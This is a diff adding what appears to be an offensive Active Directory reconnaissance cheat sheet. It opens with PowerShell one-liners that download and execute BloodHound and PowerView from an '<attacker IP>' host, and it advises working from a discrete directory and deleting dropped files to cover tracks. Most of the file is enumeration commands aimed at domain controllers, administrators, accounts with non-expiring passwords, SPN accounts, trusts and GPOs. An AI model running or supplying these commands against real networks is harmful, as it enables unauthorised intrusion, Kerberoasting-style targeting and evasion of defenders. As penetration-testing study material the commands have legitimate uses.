@@ -1,0 +1,163 @@
+
+Active Directory
+
+
+# BloodHound
+cd to a discrete, writable directory (c:\users\<user>\appdata\local).
+
+iex (new-object net.webclient).downloadstring('http://<attacker IP>/BloodHound.ps1')
+
+Invoke-Bloodhound
+
+Bloodhound will create the following files:
+	group_memberships.csv
+	local_admins.csv
+	trusts.csv
+	user_sessions.csv
+
+Download the files as needed, then delete files dropped to disk.
+=========================================================================================================================
+
+# PowerView
+cd to a discrete, writable directory (c:\users\<user>\appdata\local).
+
+iex (new-object net.webclient).downloadstring('http://<attacker IP>/PowerView.ps1')
+
+Invoke-ACLScanner | Export-PowerViewCSV acls.csv
+
+Download the files as needed, then delete files dropped to disk.
+=========================================================================================================================
+
+# ADACLScanner
+cd to a discrete, writable directory (c:\users\<user>\appdata\local).
+
+iex (new-object net.webclient).downloadfile('http://<target IP>/ADACLScan.ps1', 'ADACLScan.ps1')
+
+.\ADACLScan.ps1 -Base "OU=CORP,DC=CONTOS,DC=COM"
+
+	or (default is CSV output)
+
+.\ADACLScan.ps1 -Base "OU=CORP,DC=CONTOS,DC=COM" -HTML
+
+File will be saved to something like: domain_DOMAIN_adAclOutput<date>_<time>.csv or .htm
+
+Download the files as needed, then delete files dropped to disk.
+=========================================================================================================================
+
+# Show Domain Controllers (DC)
+dsquery server
+get-netdomaincontroller
+net group “domain controllers” /domain
+net view \\<server>			DCs contain SYSVOL and NETLOGON shares.
+cmd.exe /c set				LOGONSERVER variable.
+
+# Show DC in a specific domain
+dsquery server -domain <something.int>
+get-netdomaincontroller -domain <something.int>
+nslookup <something.int>	Internally, this will likely return DCs that are DNS servers.
+nslookup 					pseudo-shell
+	set type=all
+	_ldap._tcp.<something.int>
+nbtstat -a					Look for the attribute 1C.
+
+# Show DCs forest-wide
+dsquery server -forest
+get-netforestdomain
+
+# Show Computer Account Objects
+Show computer accounts
+dsquery computer
+dsquery * -filter “(objectclass=computer)” -attr dnshostname,description,operatingsystem,operatingsystemversion -limit 0
+get-netcomputer
+get-netcomputer -fulldata | select-object dnshostname,description,operatingsystem,operatingsystemversion
+
+# Show servers based on description
+dsquery * -filter “&(objectclass=computer)(operatingsystem=*server*)” -attr dnshostname,description,operatingsystem,operatingsystemversion -limit 0
+=========================================================================================================================
+
+# Show all Active Directory (AD) user accounts
+dsquery user -limit 0
+get-netuser 			This will display all accounts and their attributes.
+get-netuser | select-object samaccountname
+net user /domain
+
+# Show attributes of a user account
+dsquery * -filter “&(objectclass=user)(samaccountname=<user>)” -attr *
+get-net-user <user>
+
+# Show users with no password expiration
+dsquery * -filter “&(objectclass=user)(useraccountcontrol>=65535)” -attr samaccountname,name
+get-netuser -filter "useraccountcontrol>=65535" | select-object samaccountname,name
+
+# Show user accounts and their associated SPNs
+dsquery.exe * -filter "(serviceprincipalname=*)" -attr samaccountname, serviceprincipalname
+dsquery.exe * -filter "&(serviceprincipalname=*)(samaccounttype=805306368)" -attr samaccountname,serviceprincipalname
+get-netuser -spn | select-object samaccountname,serviceprincipalname
+=========================================================================================================================
+
+# Show administrators
+dsquery * -filter “&(objectclass=user)(admincount=1)” -attr samaccountname,name
+dsquery * -filter “&(objectclass=group)(name=*admin*)” -attr member -limit 0 -l
+dsquery group -name *admin*
+get-netuser -admincount | select-object samaccountname,name
+get-netgroup -fulldata -groupname "*admin*" | select-object member
+
+# Show administrators with no password expiration
+dsquery * -filter “&(objectclass=user)(useraccountcontrol>=65535)(admincount=1)” -attr samaccountname,name
+get-netuser -filter "(useraccountcontrol>=65535)(admincount=1)" | select-object samaccountname,name
+
+# Show domain admins
+dsquery * -filter “name=domain admins” -attr member -l
+get-netgroup -fulldata -groupname "domain admins" | select-object member
+net group “domain admins” /domain
+
+# Show enterprise admins
+dsquery * -filter “name=enterprise admins” -attr member -d <forest domain.int> 
+get-netgroup -fulldata -groupname "enterprise admins" | select-object member
+net group “enterprise admins” /domain
+
+# Show local administrators on DCs
+dsquery * -filter “name=administrators” -attr member -l
+get-netgroup -fulldata -groupname "administrators" | select-object member
+net localgroup administrators /domain
+=========================================================================================================================
+
+# Show Organizational Units (OU)
+dsquery ou -limit 0
+get-netou
+get-netou -fulldata
+
+# Show users under a specific OU
+dsquery * “ou=something,dc=domain,dc=int” -filter objectclass=user
+
+# Show child OUs under parent OU
+dsquery * “ou=something,dc=domain,dc=int” -filter objectcategory=organizationalunit) -attr name
+=========================================================================================================================
+ 
+# Show All Group Policy Objects (GPO) data
+dsquery * -filter “(objectclass=grouppolicycontainer)” -attr *
+get-netgpo
+
+# Map GPO names (UUID) to display names
+dsquery * -filter “(objectclass=grouppolicycontainer)” -attr name,displayname
+get-netgpo | select-object name,displayname
+
+# Show OUs and applied GPOs
+dsquery * -filter “(objectcategory=organizationalunit)” -attr distinguishedname, gplink
+get-netou -fulldata | select-object distinguishedname, gplink
+=========================================================================================================================
+
+# Show Trust Relationships
+dsquery * -filter “(objectclass=TrustedDomain)” -attr trustpartner,flatname,trustdirection
+get-netdomaintrust
+
+# Show Sites and Subnets
+dsquery subnet
+get-netsubnet
+dsquery site
+get-netsite
+dsquery * “cn=subnets,cn=sites,cn=configuration,dc=<something>,dc=<int>” -attr description,cn,siteobject
+
+# Show AD Partitions
+dsquery partition
+
